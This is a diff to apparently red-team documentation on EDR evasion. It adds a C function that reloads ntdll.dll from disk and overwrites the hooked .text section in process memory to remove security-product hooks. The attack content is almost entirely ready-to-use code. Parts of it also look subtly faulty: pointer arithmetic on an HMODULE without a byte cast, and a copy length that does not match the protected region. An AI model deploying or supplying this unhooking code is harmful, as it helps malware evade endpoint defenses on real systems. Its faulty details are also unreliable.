@@ -10,7 +10,7 @@ Some EDR vendors inject their hook inside processes's modules, like injecting th
 
 To bypass this, we can try to list all modules that are loaded inside the process; they proceed to restore the module's original code.
 
-```C title="Unhook.c"
+```c title="Unhook.c"
 // Original source: redteamleaders.com
 #include <windows.h>
 #include <winnt.h>
@@ -67,6 +67,40 @@ bool UnhookNtdll() {
     CloseHandle(hFile);
 
     return true;
+}
+
+
+void UnhookNtdll_2() {
+    // Open clean ntdll from disk
+    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    DWORD size = GetFileSize(hFile, NULL);
+    BYTE* cleanNtdll = new BYTE[size];
+    ReadFile(hFile, cleanNtdll, size, &size, NULL);
+
+    // Locate .text section in the clean file
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(cleanNtdll + dos->e_lfanew);
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(section[i].Name, ".text", 5) == 0) {
+            // Overwrite hooked ntdll .text in memory
+            DWORD oldProtect;
+            VirtualProtect((LPVOID)(GetModuleHandleW(L"ntdll.dll") + section[i].VirtualAddress),
+                section[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+            memcpy((LPVOID)(GetModuleHandleW(L"ntdll.dll") + section[i].VirtualAddress),
+                cleanNtdll + section[i].PointerToRawData, section[i].SizeOfRawData);
+
+            VirtualProtect((LPVOID)(GetModuleHandleW(L"ntdll.dll") + section[i].VirtualAddress),
+                section[i].Misc.VirtualSize, oldProtect, &oldProtect);
+
+            break;
+        }
+    }
+
+    delete[] cleanNtdll;
+    CloseHandle(hFile);
 }
 
 ```
